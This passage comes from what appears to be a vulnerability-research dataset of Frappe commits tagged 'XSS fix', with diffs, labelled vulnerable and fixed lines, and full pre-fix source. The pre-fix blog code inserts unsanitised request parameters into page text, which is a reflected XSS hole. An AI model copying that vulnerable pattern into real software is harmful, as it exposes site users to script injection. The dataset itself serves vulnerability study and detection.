self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n"}}, "msg": "fix(Barcode): excluding Barcode feild from XSS FIlter (#7605)\n\n(cherry picked from commit e579b8960e1c34e7ad0bf794a10596b40530bc09)"}}, "https://github.com/Benefactors/rosling": {"2fa19c25066ed17478d683666895e3266936aee6": {"url": "https://api.github.com/repos/Benefactors/rosling/commits/2fa19c25066ed17478d683666895e3266936aee6", "html_url": "https://github.com/Benefactors/rosling/commit/2fa19c25066ed17478d683666895e3266936aee6", "sha": "2fa19c25066ed17478d683666895e3266936aee6", "keyword": "XSS fix", "diff": "diff --git a/frappe/website/doctype/blog_post/blog_post.py b/frappe/website/doctype/blog_post/blog_post.py\nindex a20e9fa12..e4c757e64 100644\n--- a/frappe/website/doctype/blog_post/blog_post.py\n+++ b/frappe/website/doctype/blog_post/blog_post.py\n@@ -7,7 +7,7 @@\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n@@ -95,7 +95,7 @@ def get_list_context(context=None):\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n@@ -107,7 +107,7 @@ def get_list_context(context=None):\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "message": "", "files": {"/frappe/website/doctype/blog_post/blog_post.py": {"changes": [{"diff": "\n from frappe import _\n from frappe.website.website_generator import WebsiteGenerator\n from frappe.website.render import clear_cache\n-from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\n+from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\n from frappe.website.utils import find_first_image, get_comment_list\n \n class BlogPost(WebsiteGenerator):\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown"], "goodparts": ["from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html"]}, {"diff": "\n \t\ttitle = _('Blog')\n \t)\n \n-\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n+\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n \tif category:\n \t\tcategory_title = get_blog_category(category)\n \t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category"], "goodparts": ["\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)"]}, {"diff": "\n \t\tlist_context.title = blogger\n \n \telif frappe.local.form_dict.txt:\n-\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n+\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n \n \tif list_context.sub_title:\n \t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n", "add": 1, "remove": 1, "filename": "/frappe/website/doctype/blog_post/blog_post.py", "badparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)"], "goodparts": ["\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))"]}], "source": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar \treturn posts ", "sourceWithComments": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n"}}, "msg": "fix(blog): Fix possible reflected XSS attack vector"}, "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37": {"url": "https://api.github.com/repos/Benefactors/rosling/commits/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "html_url": "https://github.com/Benefactors/rosling/commit/acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "sha": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "keyword": "XSS fix", "diff": "diff --git a/frappe/core/doctype/doctype/doctype.py b/frappe/core/doctype/doctype/doctype.py\nindex a06a33df1..fedb605ad 100644\n--- a/frappe/core/doctype/doctype/doctype.py\n+++ b/frappe/core/doctype/doctype/doctype.py\n@@ -715,7 +715,6 @@ def scrub_fetch_from(field):\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n \ndiff --git a/frappe/model/base_document.py b/frappe/model/base_document.py\nindex 922557fee..982c54c3a 100644\n--- a/frappe/model/base_document.py\n+++ b/frappe/model/base_document.py\n@@ -627,7 +627,7 @@ def _sanitize_content(self):\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n", "message": "", "files": {"/frappe/core/doctype/doctype/doctype.py": {"changes": [{"diff": "\n \tfor d in fields:\n \t\tif not d.permlevel: d.permlevel = 0\n \t\tif d.fieldtype != \"Table\": d.allow_bulk_edit = 0\n-\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1\n \t\tif not d.fieldname:\n \t\t\td.fieldname = d.fieldname.lower()\n ", "add": 0, "remove": 1, "filename": "/frappe/core/doctype/doctype/doctype.py", "badparts": ["\t\tif d.fieldtype == \"Barcode\": d.ignore_xss_filter = 1"], "goodparts": []}]}, "/frappe/model/base_document.py": {"changes": [{"diff": "\n \n \t\t\telif df and (df.get(\"ignore_xss_filter\")\n \t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n-\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n+\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n \n \t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n \t\t\t\t\t\tor self.docstatus==2\n", "add": 1, "remove": 1, "filename": "/frappe/model/base_document.py", "badparts": ["\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")"], "goodparts": ["\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")"]}], "source": "\n from __future__ import unicode_literals from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\t \t\tfor key in default_fields: \t\t\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): \t\t\tfor v in value: \t\t\t\tself.append(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, 